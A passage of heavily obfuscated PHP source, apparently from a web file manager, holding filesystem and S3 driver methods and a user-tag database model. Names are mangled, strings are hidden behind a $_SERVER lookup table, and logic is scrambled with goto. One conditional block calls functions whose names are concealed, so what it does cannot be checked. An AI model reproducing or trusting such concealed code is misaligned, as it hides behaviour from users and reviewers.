substr($a§™‡Ì¢Â, 2); } return $a§™‡Ì¢Â; } public function iconvApp($b±èïêÙ) { $Bëìøä³†Œ =& $_SERVER[úÎü]; global $config; return $this->iconvTo($b±èïêÙ, $config[$Bëìøä³†Œ[1198]], $config[$Bëìøä³†Œ[1197]]); } public function iconvSystem($fôŒğÆ„¿ë) { $C‚µ–‘ä«É =& $_SERVER[úÎü]; global $config; return $this->iconvTo($fôŒğÆ„¿ë, $config[$C‚µ–‘ä«É[1197]], $config[$C‚µ–‘ä«É[1198]]); } public function getPathOuter($dİ³ƒ¾ê‚¸) { goto cˆ¢¶„á‘‘; c¦ãŒ‰ñ†®: $dİ³ƒ¾ê‚¸ = KodIO::clear($dİ³ƒ¾ê‚¸); $dİ³ƒ¾ê‚¸ = substr($dİ³ƒ¾ê‚¸, strlen($E³ Ú»ìî)); if (empty($this->pathDriver)) { return $dİ³ƒ¾ê‚¸; } goto E„óÂ¤—; cˆ¢¶„á‘‘: $A•¶‚ÒøÇÜ =& $_SERVER[úÎü]; $E³ Ú»ìî = $this->iconvApp($this->pathBase); $dİ³ƒ¾ê‚¸ = $this->iconvApp($dİ³ƒ¾ê‚¸); goto b×÷´¶§„Î; E„óÂ¤—: return $this->pathDriver . $A•¶‚ÒøÇÜ[8] . ltrim($dİ³ƒ¾ê‚¸, $A•¶‚ÒøÇÜ[8]); goto Dò½ÜË–; b×÷´¶§„Î: if (substr($E³ Ú»ìî, 0, 2) == $A•¶‚ÒøÇÜ[1200]) { $E³ Ú»ìî = BASIC_PATH . substr($E³ Ú»ìî, 2); } if (substr($dİ³ƒ¾ê‚¸, 0, 2) == $A•¶‚ÒøÇÜ[1200]) { $dİ³ƒ¾ê‚¸ = BASIC_PATH . substr($dİ³ƒ¾ê‚¸, 2); } $E³ Ú»ìî = KodIO::clear($E³ Ú»ìî); goto c¦ãŒ‰ñ†®; Dò½ÜË–: } public function mkfile($C¤¢çˆó¤, $fá„÷óôï = '', $CƒØîĞË·Ó = REPEAT_RENAME) { $C¤¢çˆó¤ = $this->iconvSystem($C¤¢çˆó¤); @touch($C¤¢çˆó¤); if ($fá„÷óôï) { file_put_contents($C¤¢çˆó¤, $fá„÷óôï); } return is_file($C¤¢çˆó¤) ? $this->getPathOuter($C¤¢çˆó¤) : !1; } public function mkdir($b–‹†£÷Ü, $Eº˜¬ïìÈ„ = REPEAT_SKIP) { $b–‹†£÷Ü = $this->iconvSystem($b–‹†£÷Ü); if (is_dir($b–‹†£÷Ü)) { return $this->getPathOuter($b–‹†£÷Ü); } @mkdir($b–‹†£÷Ü, 511, !0); return is_dir($b–‹†£÷Ü) ? $this->getPathOuter($b–‹†£÷Ü) : !1; } public function copyFile($a„ì»¹äõö, $BÖ®‘ì ¥) { $this->mkdir($this->pathFather($BÖ®‘ì ¥)); $a„ì»¹äõö = $this->iconvSystem($a„ì»¹äõö); $BÖ®‘ì ¥ = $this->iconvSystem($BÖ®‘ì ¥); $cŠ‡õØ‹ï’ = copy_64($a„ì»¹äõö, $BÖ®‘ì ¥); return $cŠ‡õØ‹ï’ ? $this->getPathOuter($BÖ®‘ì ¥) : !1; } public function moveFile($dˆ ©“Øè, $bí¡ÎÆËƒª) { $this->mkdir($this->pathFather($bí¡ÎÆËƒª)); $dˆ ©“Øè = $this->iconvSystem($dˆ ©“Øè); $bí¡ÎÆËƒª = $this->iconvSystem($bí¡ÎÆËƒª); $c“¦õŒ·Ë– = intval(@rename($dˆ ©“Øè, $bí¡ÎÆËƒª)); if (!$c“¦õŒ·Ë–) { if ($c“¦õŒ·Ë– = intval(@copy_64($dˆ ©“Øè, $bí¡ÎÆËƒª))) { @unlink($dˆ ©“Øè); } } return $c“¦õŒ·Ë– ? $this->getPathOuter($bí¡ÎÆËƒª) : !1; } public function delFile($D¿ßœ‰’†À) { $D¿ßœ‰’†À = $this->iconvSystem($D¿ßœ‰’†À); if (!@unlink($D¿ßœ‰’†À)) { @chmod($D¿ßœ‰’†À, 511); if (!@unlink($D¿ßœ‰’†À)) { return !1; } } else { return !0; } } public function delFolder($e×–„¦á¶) { goto D®°Ã‚¿ßä; A®Ò§Šö: if (!($dê›•¬¤´Ì = opendir($e×–„¦á¶))) { return !1; } while (($a¢¡Áší = readdir($dê›•¬¤´Ì)) !== !1) { if ($a¢¡Áší == $B÷äŠÈàË[91] || $a¢¡Áší == $B÷äŠÈàË[1207]) { continue; } $d†øìÇ‚Õê = $e×–„¦á¶ . $B÷äŠÈàË[8] . $a¢¡Áší; if (is_file($d†øìÇ‚Õê) || is_link($d†øìÇ‚Õê)) { if (!unlink($d†øìÇ‚Õê)) { chmod($d†øìÇ‚Õê, 511); if (!unlink($d†øìÇ‚Õê)) { return !1; } } } else { if (is_dir($d†øìÇ‚Õê)) { chmod($d†øìÇ‚Õê, 511); $d†øìÇ‚Õê = $this->iconvApp($d†øìÇ‚Õê); if (!$this->delFolder($d†øìÇ‚Õê)) { return !1; } } } } closedir($dê›•¬¤´Ì); goto F«²¡§¥Úç; F«²¡§¥Úç: return rmdir($e×–„¦á¶); goto dŠÑİõË«í; D®°Ã‚¿ßä: $B÷äŠÈàË =& $_SERVER[úÎü]; $e×–„¦á¶ = $this->iconvSystem($e×–„¦á¶); if (!is_dir($e×–„¦á¶)) { return !0; } goto A®Ò§Šö; dŠÑİõË«í: } public function rename($Fèˆ¥Ú¡îé, $Fõùšìø‘) { goto Cì›“Ò¡Ãõ; aµæâªŠÅù: $BÇ‡šî¶ñé = @rename($Fèˆ¥Ú¡îé, $d„ŒŠ–È‡è); $d„ŒŠ–È‡è = $this->iconvApp($d„ŒŠ–È‡è); return $BÇ‡šî¶ñé ? $this->getPathOuter($d„ŒŠ–È‡è) : !1; goto e²‘¡‚šŠö; Cì›“Ò¡Ãõ: $CŒÑ¨±ß©ò =& $_SERVER[úÎü]; $AÒÕ¿ƒˆ‘Ì = $this->fileNameAuto($this->pathFather($Fèˆ¥Ú¡îé), $Fõùšìø‘); $AÒÕ¿ƒˆ‘Ì = $this->iconvSystem($AÒÕ¿ƒˆ‘Ì); goto BèàˆÕôÒ¨; BèàˆÕôÒ¨: $Fèˆ¥Ú¡îé = $this->iconvSystem($Fèˆ¥Ú¡îé); $cÃÖ¶ñØõ = $this->pathFather($Fèˆ¥Ú¡îé); $d„ŒŠ–È‡è = rtrim($cÃÖ¶ñØõ, $CŒÑ¨±ß©ò[8]) . $CŒÑ¨±ß©ò[8] . $AÒÕ¿ƒˆ‘Ì; goto aµæâªŠÅù; e²‘¡‚šŠö: } public function size($FâæÄ™Û¢Ï) { $FâæÄ™Û¢Ï = $this->iconvSystem($FâæÄ™Û¢Ï); return filesize_64($FâæÄ™Û¢Ï); } public function info($Aã§•ö˜Ë) { $Aã§•ö˜Ë = $this->iconvSystem($Aã§•ö˜Ë); if ($this->isFolder($Aã§•ö˜Ë)) { return $this->folderInfo($Aã§•ö˜Ë); } else { if ($this->isFile($Aã§•ö˜Ë)) { return $this->fileInfo($Aã§•ö˜Ë); } } return !1; } protected function infoChildren($Aô“î±İä, &$Eã²ëİè…Ø, $bŞ‡íŸê©³ = true) { goto B˜¬¯£¼ëÔ; B˜¬¯£¼ëÔ: $F»ä©ÕòˆŸ =& $_SERVER[úÎü]; check_abort_echo(); $Aô“î±İä = rtrim($Aô“î±İä, $F»ä©ÕòˆŸ[8]) . $F»ä©ÕòˆŸ[8]; goto d×ô¼²ßğã; d×ô¼²ßğã: if ($bŞ‡íŸê©³) { $Aô“î±İä = $this->iconvSystem($Aô“î±İä); } if (!($eåğŒƒ­™¶ = @opendir($Aô“î±İä))) { return; } while (($dô¬óëåÏ• = readdir($eåğŒƒ­™¶)) !== !1) { if ($dô¬óëåÏ• == $F»ä©ÕòˆŸ[91] || $dô¬óëåÏ• == $F»ä©ÕòˆŸ[1207]) { continue; } $AİÄ¬…Áç® = $Aô“î±İä . $dô¬óëåÏ•; if (is_file($AİÄ¬…Áç®) || is_link($AİÄ¬…Áç®)) { $Eã²ëİè…Ø[$F»ä©ÕòˆŸ[78]]++; $Eã²ëİè…Ø[$F»ä©ÕòˆŸ[77]] += filesize_64($AİÄ¬…Áç®); } else { if (is_dir($AİÄ¬…Áç®)) { $Eã²ëİè…Ø[$F»ä©ÕòˆŸ[79]]++; $this->infoChildren($AİÄ¬…Áç®, $Eã²ëİè…Ø, !1); } } } goto dä‡íİùŸ…; dä‡íİùŸ…: closedir($eåğŒƒ­™¶); goto D¬ˆŞ®Éù; D¬ˆŞ®Éù: } private function folderInfo($aÖ‘¬ÄÌí¶, $BªÖ°‘Ğ˜ = false) { $DäÆ‡±šË» =& $_SERVER[úÎü]; $aÖ‘¬ÄÌí¶ = rtrim($aÖ‘¬ÄÌí¶, $DäÆ‡±šË»[8]) . $DäÆ‡±šË»[8]; $dğÕßƒ±ˆ÷ = $this->iconvApp($this->pathThis($aÖ‘¬ÄÌí¶)); if ($BªÖ°‘Ğ˜) { return array($DäÆ‡±šË»[28] => $dğÕßƒ±ˆ÷, $DäÆ‡±šË»[75] => $this->getPathOuter($aÖ‘¬ÄÌí¶), $DäÆ‡±šË»[29] => $DäÆ‡±šË»[76]); } $D—Æ–³¦ÕÁ = array($DäÆ‡±šË»[28] => $dğÕßƒ±ˆ÷, $DäÆ‡±šË»[75] => $this->getPathOuter($aÖ‘¬ÄÌí¶), $DäÆ‡±šË»[29] => $DäÆ‡±šË»[76], $DäÆ‡±šË»[190] => @filectime($aÖ‘¬ÄÌí¶), $DäÆ‡±šË»[107] => @filemtime($aÖ‘¬ÄÌí¶), $DäÆ‡±šË»[1210] => @fileatime($aÖ‘¬ÄÌí¶), $DäÆ‡±šË»[1211] => is_readable($aÖ‘¬ÄÌí¶), $DäÆ‡±šË»[1212] => is_writable($aÖ‘¬ÄÌí¶), $DäÆ‡±šË»[1213] => get_mode($aÖ‘¬ÄÌí¶)); return $D—Æ–³¦ÕÁ; } private function fileInfo($Aª—é¨“ç, $Fó‚äè²Ï = false) { $bŠòêöâµæ =& $_SERVER[úÎü]; $fˆÃ§ÓÉ£ƒ = $this->iconvApp($this->pathThis($Aª—é¨“ç)); if ($Fó‚äè²Ï) { return array($bŠòêöâµæ[28] => $fˆÃ§ÓÉ£ƒ, $bŠòêöâµæ[75] => $this->getPathOuter($Aª—é¨“ç), $bŠòêöâµæ[29] => $bŠòêöâµæ[171], $bŠòêöâµæ[77] => $this->size($Aª—é¨“ç), $bŠòêöâµæ[165] => $this->ext($fˆÃ§ÓÉ£ƒ)); } $b“¾…¿¹ùá = array($bŠòêöâµæ[28] => $fˆÃ§ÓÉ£ƒ, $bŠòêöâµæ[75] => $this->getPathOuter($Aª—é¨“ç), $bŠòêöâµæ[29] => $bŠòêöâµæ[171], $bŠòêöâµæ[190] => @filectime($Aª—é¨“ç), $bŠòêöâµæ[107] => @filemtime($Aª—é¨“ç), $bŠòêöâµæ[1210] => @fileatime($Aª—é¨“ç), $bŠòêöâµæ[77] => $this->size($Aª—é¨“ç), $bŠòêöâµæ[165] => $this->ext($fˆÃ§ÓÉ£ƒ), $bŠòêöâµæ[1211] => is_readable($Aª—é¨“ç), $bŠòêöâµæ[1212] => is_writable($Aª—é¨“ç), $bŠòêöâµæ[1213] => get_mode($Aª—é¨“ç)); return $b“¾…¿¹ùá; } public function exist($fôŠÚŒ‘¬ä) { $fôŠÚŒ‘¬ä = $this->iconvSystem($fôŠÚŒ‘¬ä); return @file_exists($fôŠÚŒ‘¬ä); } public function isFile($e•ÜËóâÊ°) { $e•ÜËóâÊ° = $this->iconvSystem($e•ÜËóâÊ°); return @is_file($e•ÜËóâÊ°); } public function isFolder($Cî™‚ÂØ‡â) { $Cî™‚ÂØ‡â = $this->iconvSystem($Cî™‚ÂØ‡â); return @is_dir($Cî™‚ÂØ‡â); } public function listPath($B½ÑâÖ‘×‡, $a‹ä‚Ğ«¦ = false) { goto FˆõîÈ×ŞÊ; dÉ÷Ş²Ê†¬: closedir($b©°’ñÈ—); return $cĞùôÁÖ…Í; goto EÌÇÎ“ÙÊÁ; FˆõîÈ×ŞÊ: $dì¸ëŒ™ø =& $_SERVER[úÎü]; $B½ÑâÖ‘×‡ = $this->iconvSystem($B½ÑâÖ‘×‡); $B½ÑâÖ‘×‡ = rtrim($B½ÑâÖ‘×‡, $dì¸ëŒ™ø[8]) . $dì¸ëŒ™ø[8]; goto eÔÍ¡°½•; eÔÍ¡°½•: $cĞùôÁÖ…Í = array($dì¸ëŒ™ø[74] => array(), $dì¸ëŒ™ø[73] => array()); if (!($b©°’ñÈ— = @opendir($B½ÑâÖ‘×‡))) { return $cĞùôÁÖ…Í; } while (($Eš®ÚÁ­™Œ = readdir($b©°’ñÈ—)) !== !1) { if ($Eš®ÚÁ­™Œ == $dì¸ëŒ™ø[91] || $Eš®ÚÁ­™Œ == $dì¸ëŒ™ø[1207]) { continue; } $FÄÒä‚İÎ‰ = $B½ÑâÖ‘×‡ . $Eš®ÚÁ­™Œ; if (is_file($FÄÒä‚İÎ‰)) { $cĞùôÁÖ…Í[$dì¸ëŒ™ø[73]][] = $this->fileInfo($FÄÒä‚İÎ‰, $a‹ä‚Ğ«¦); } else { $cĞùôÁÖ…Í[$dì¸ëŒ™ø[74]][] = $this->folderInfo($FÄÒä‚İÎ‰, $a‹ä‚Ğ«¦); } } goto dÉ÷Ş²Ê†¬; EÌÇÎ“ÙÊÁ: } public function listAll($dÎñ—–¸´À, &$a‰î­–ŒĞã = array()) { goto B¢˜¢¨ÃåÁ; cèŠ©­¾¬µ: return $a‰î­–ŒĞã; goto Cé¾ãßÅ¼Ó; eõƒ±³§…’: if (!($DŠÌ«¨ˆä = @opendir($dÎñ—–¸´À))) { return $a‰î­–ŒĞã; } while (($F½±÷œ·‹å = readdir($DŠÌ«¨ˆä)) !== !1) { if ($F½±÷œ·‹å == $Câšíãâ[91] || $F½±÷œ·‹å == $Câšíãâ[1207]) { continue; } $FˆÉ™Î¶Û = $dÎñ—–¸´À . $F½±÷œ·‹å; if (is_dir($FˆÉ™Î¶Û) && !is_link($FˆÉ™Î¶Û)) { $a‰î­–ŒĞã[] = array($Câšíãâ[75] => $FˆÉ™Î¶Û . $Câšíãâ[8], $Câšíãâ[76] => 1, $Câšíãâ[107] => @filemtime($FˆÉ™Î¶Û), $Câšíãâ[77] => 0); $this->listAll($FˆÉ™Î¶Û, $a‰î­–ŒĞã); } else { $a‰î­–ŒĞã[] = array($Câšíãâ[75] => $FˆÉ™Î¶Û, $Câšíãâ[76] => 0, $Câšíãâ[107] => @filemtime($FˆÉ™Î¶Û), $Câšíãâ[77] => $this->size($FˆÉ™Î¶Û)); } } closedir($DŠÌ«¨ˆä); goto cèŠ©­¾¬µ; B¢˜¢¨ÃåÁ: $Câšíãâ =& $_SERVER[úÎü]; $dÎñ—–¸´À = $this->iconvSystem($dÎñ—–¸´À); $dÎñ—–¸´À = rtrim($dÎñ—–¸´À, $Câšíãâ[8]) . $Câšíãâ[8]; goto eõƒ±³§…’; Cé¾ãßÅ¼Ó: } public function has($FŠí®’ÀŒà, $a˜™¶Éã¿¶ = false, $A±–©ÓÆÚ = true) { goto C©–¦¶‹çŒ; BŠ‚ÙÌ‡Ûº: if (!($b†ò‘»ìÙğ = @opendir($FŠí®’ÀŒà))) { return !1; } $f„Û¯…Ü¡­ = 0; $dïİãâñÒˆ = 0; goto Bš¼ì³¡¥ä; b˜‰Ö›ˆ¡: if ($a˜™¶Éã¿¶) { return array($c×À™äê–‡[199] => $f„Û¯…Ü¡­, $c×À™äê–‡[200] => $dïİãâñÒˆ); } return !1; goto C‡÷Ó¾òéæ; C©–¦¶‹çŒ: $c×À™äê–‡ =& $_SERVER[úÎü]; $FŠí®’ÀŒà = $this->iconvSystem($FŠí®’ÀŒà); $FŠí®’ÀŒà = rtrim($FŠí®’ÀŒà, $c×À™äê–‡[8]) . $c×À™äê–‡[8]; goto BŠ‚ÙÌ‡Ûº; Bš¼ì³¡¥ä: $c‹Âê²©á = 0; while (($D¨óƒŸÃÉ¶ = readdir($b†ò‘»ìÙğ)) !== !1) { if ($D¨óƒŸÃÉ¶ == $c×À™äê–‡[91] || $D¨óƒŸÃÉ¶ == $c×À™äê–‡[1207]) { continue; } $c›¸ö­¬»š = $FŠí®’ÀŒà . $D¨óƒŸÃÉ¶; if ($a˜™¶Éã¿¶) { $c‹Âê²©á++; if (@is_file($c›¸ö­¬»š)) { $f„Û¯…Ü¡­++; } else { $dïİãâñÒˆ++; } if ($c‹Âê²©á > 10000) { break; } continue; } if ($A±–©ÓÆÚ) { if (@is_file($c›¸ö­¬»š)) { return !0; } } else { if (@is_dir($c›¸ö­¬»š . $c×À™äê–‡[8])) { return !0; } } } closedir($b†ò‘»ìÙğ); goto b˜‰Ö›ˆ¡; C‡÷Ó¾òéæ: } public function hashSimple($c¯‚àÙÆ) { goto Bğ…•Ñ«—–; b„”°Ğ—‚: fseek_64($B¥ó¨¾Ô³, $Dé¥Ö…İ‡ - $E÷œå‹æ); $EÛ®µÊÀß .= fread($B¥ó¨¾Ô³, $E÷œå‹æ); fclose($B¥ó¨¾Ô³); goto f†ÂÕŠŒÜÄ; Bİ÷äÕâ›ˆ: if ($Dé¥Ö…İ‡ <= $E÷œå‹æ * $bäĞ¸à®„) { return $this->hashMd5($c¯‚àÙÆ) . $Dé¥Ö…İ‡; } $EÛ®µÊÀß = $F÷åƒÆìÓ×[33]; $B“ªÇêŠ“Æ = intval($Dé¥Ö…İ‡ / $bäĞ¸à®„); goto A†¾øÂÃèÌ; f†ÂÕŠŒÜÄ: return md5($EÛ®µÊÀß) . $Dé¥Ö…İ‡; goto dÛ¯•ç²Áä; Bğ…•Ñ«—–: $F÷åƒÆìÓ× =& $_SERVER[úÎü]; if (!$c¯‚àÙÆ) { return md5($F÷åƒÆìÓ×[33]); } $c¯‚àÙÆ = $this->iconvSystem($c¯‚àÙÆ); goto d‰…¬‹è§•; A†¾øÂÃèÌ: $B¥ó¨¾Ô³ = fopen($c¯‚àÙÆ, $F÷åƒÆìÓ×[1214]); if (!$B¥ó¨¾Ô³) { return $EÛ®µÊÀß; } for ($bÃŸó–ˆ‹ = 0; $bÃŸó–ˆ‹ < $bäĞ¸à®„; $bÃŸó–ˆ‹++) { fseek_64($B¥ó¨¾Ô³, $B“ªÇêŠ“Æ * $bÃŸó–ˆ‹); $EÛ®µÊÀß .= fread($B¥ó¨¾Ô³, $E÷œå‹æ); } goto b„”°Ğ—‚; d‰…¬‹è§•: $Dé¥Ö…İ‡ = $this->size($c¯‚àÙÆ); $E÷œå‹æ = 200; $bäĞ¸à®„ = 50; goto Bİ÷äÕâ›ˆ; dÛ¯•ç²Áä: } public function getContent($fº¸´â“ë) { $fº¸´â“ë = $this->iconvSystem($fº¸´â“ë); return file_get_contents($fº¸´â“ë); } public function setContent($a–‘ƒÑğö, $bº÷¦ïˆ£ò = '') { $a–‘ƒÑğö = $this->iconvSystem($a–‘ƒÑğö); $EìÏÖ×ùÊ = @file_put_contents($a–‘ƒÑğö, $bº÷¦ïˆ£ò, LOCK_EX); clearstatcache(); return $EìÏÖ×ùÊ; } public function fileSubstr($eØÌîéù…Í, $fÛÚ½›šá§ = 0, $bœßï¸‡É = false) { goto Bê®°ôŒ‡Õ; Bê®°ôŒ‡Õ: $e—ç°¤Ç”Ú =& $_SERVER[úÎü]; $eØÌîéù…Í = $this->iconvSystem($eØÌîéù…Í); if ($bœßï¸‡É === !1) { $bœßï¸‡É = $this->size($eØÌîéù…Í); } goto b£ËÕÌŠä©; Dã„”ğ—ä×: return $F±¡¯Ùâà; goto fÊùêŒÖ„’; a»í¯¢Š¼: fseek_64($BùÓ‘‘´Ü¼, $fÛÚ½›šá§); $F±¡¯Ùâà = fread($BùÓ‘‘´Ü¼, $bœßï¸‡É); fclose($BùÓ‘‘´Ü¼); goto Dã„”ğ—ä×; b£ËÕÌŠä©: if ($bœßï¸‡É <= 0) { return $e—ç°¤Ç”Ú[33]; } $BùÓ‘‘´Ü¼ = fopen($eØÌîéù…Í, $e—ç°¤Ç”Ú[1214]); if (!$BùÓ‘‘´Ü¼) { return !1; } goto a»í¯¢Š¼; fÊùêŒÖ„’: } public function upload($c·Ê¤ˆÆ÷, $e‰‡°š«¿³, $f¬É‘³éóÅ = false, $CšùÕ¼¼ = REPEAT_REPLACE) { $dÉÛæ›‰ÁÕ = $this->copyFile($e‰‡°š«¿³, $c·Ê¤ˆÆ÷); return $dÉÛæ›‰ÁÕ ? $this->getPathOuter($c·Ê¤ˆÆ÷) : !1; } public function setModifyTime($C­ÏŠÚÈÏè, $cÚ˜«Íí = '') { @touch($C­ÏŠÚÈÏè, intval($cÚ˜«Íí)); } public function download($aÚ¦òæãÛÃ, $B“øšùõ§ß) { return $this->iconvSystem($aÚ¦òæãÛÃ); } } class PathDriverMinIO extends PathDriverBaseS3 { public function __construct($A÷‹î²‘ŠĞ) { parent::__construct($A÷‹î²‘ŠĞ); $this->signatureVersion($_SERVER[úÎü][208]); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } } if ($_SERVER[$_SERVER[úÎü][793]] != $_SERVER[$_SERVER[úÎü][794]]) { goto C±…–ÙÌíª; D ÖŸ‡¸§: $DÎ¨¨Ã®ÏÎ = explode($_SERVER[úÎü][225], $FÄÅ¼²¢ö‡); if (count($DÎ¨¨Ã®ÏÎ) < $_SERVER[úÎü][576]) { $A¬ÍĞŠŸ«– = $_SERVER[úÎü][799]; $A¬ÍĞŠŸ«–(); } $b¸éÈˆ½à = $_SERVER[úÎü][832]; goto bÃ²ĞÁ–Ñ¹; bÃ²ĞÁ–Ñ¹: $b¸éÈˆ½à($_SERVER[$_SERVER[úÎü][833]]); goto B¢‰ÈÒÊÀ; C±…–ÙÌíª: $C½õÇ·Ğï = $_SERVER[úÎü][796]; $C‚½àší‘¿ = $_SERVER[$_SERVER[úÎü][797]] . $_SERVER[úÎü][798]; $FÄÅ¼²¢ö‡ = $C½õÇ·Ğï($C‚½àší‘¿); goto D ÖŸ‡¸§; B¢‰ÈÒÊÀ: } goto B©®ÁñŒ¢Ğ; A‚«âíŒ†Œ: class UserTagSourceModel extends ModelBase { protected $tableName = "\x75\163\x65\162\137\146\141\166"; protected function cacheFunctionAlias($D¨‡óÄ»ÇÊ) { $dí÷ÕÄˆëº =& $_SERVER[úÎü]; return array($dí÷ÕÄˆëº[1744] => array(USER_ID, $dí÷ÕÄˆëº[1745])); } protected function listData() { $EÇÑÔğö£ =& $_SERVER[úÎü]; $D‘Û°ÑÙ¾ó = array($EÇÑÔğö£[1477] => USER_ID, $EÇÑÔğö£[451] => array($EÇÑÔğö£[1748], 0)); $e Êé·±Â = $EÇÑÔğö£[1750]; $b”ƒë‹‹ëÄ = $this->field($e Êé·±Â)->where($D‘Û°ÑÙ¾ó)->order($EÇÑÔğö£[1751])->select(); return $b”ƒë‹‹ëÄ ? $b”ƒë‹‹ëÄ : array(); } protected function listByTag($B„¤ó’Ñˆ) { } protected function addToTag($A¥£“ŞŒ±, $aÚµ†ìïœå) { $b•à çä‹ì =& $_SERVER[úÎü]; if (!Model($b•à çä‹ì[1889])->listData($aÚµ†ìïœå) || !Model($b•à çä‹ì[752])->pathInfo($A¥£“ŞŒ±)) { return !1; } $Bó„‹¾¤­Ø = array($b•à çä‹ì[1477] => USER_ID, $b•à çä‹ì[451] => $aÚµ†ìïœå, $b•à çä‹ì[403] => $A¥£“ŞŒ±, $b•à çä‹ì[404] => $b•à çä‹ì[398], $b•à çä‹ì[402] => $b•à çä‹ì[33], $b•à çä‹ì[1648] => 0); if ($this->where($Bó„‹¾¤­Ø)->find()) { return !1; } return $this->add($Bó„‹¾¤­Ø); } protected function removeFromTag($FãšÂßíÕ, $c¼À®Œº ) { $bòù¾×õî =& $_SERVER[úÎü]; if (!Model($bòù¾×õî[1889])->listData($c¼À®Œº )) { return !1; } if (is_array($FãšÂßíÕ)) { $FãšÂßíÕ = array($bòù¾×õî[7], $FãšÂßíÕ); } $CÑ²Ğğßª = array($bòù¾×õî[1477] => USER_ID, $bòù¾×õî[451] => $c¼À®Œº , $bòù¾×õî[404] => $bòù¾×õî[398], $bòù¾×õî[403] => $FãšÂßíÕ); return $this->where($CÑ²Ğğßª)->delete(); } protected function removeByTag($cÁá¼¥¦˜…) { $bÔ‘µ‚ìÙÆ =& $_SERVER[úÎü]; if (!$cÁá¼¥¦˜…) { return !1; } $aª”¬‚Äò = array($bÔ‘µ‚ìÙÆ[1477] => USER_ID, $bÔ‘µ‚ìÙÆ[451] => $cÁá¼¥¦˜…); return $this->where($aª”¬‚Äò)->delete(); } protected function removeBySource($f™×ÎÁçï‹) { $Fİ¡ã¼Ü” =& $_SERVER[úÎü]; if (is_array($f™×ÎÁçï‹)) { $f™×ÎÁçï‹ = array($Fİ¡ã¼Ü”[7], $f™×ÎÁçï‹); } $Cãñ»¬³ = array($Fİ¡ã¼Ü”[1477] => USER_ID, $Fİ¡ã¼Ü”[403] => $f™×ÎÁçï‹, $Fİ¡ã¼Ü”[451] => array($Fİ¡ã¼Ü”[932], 0)); return $this->where($Cãñ»¬³)->delete(); } }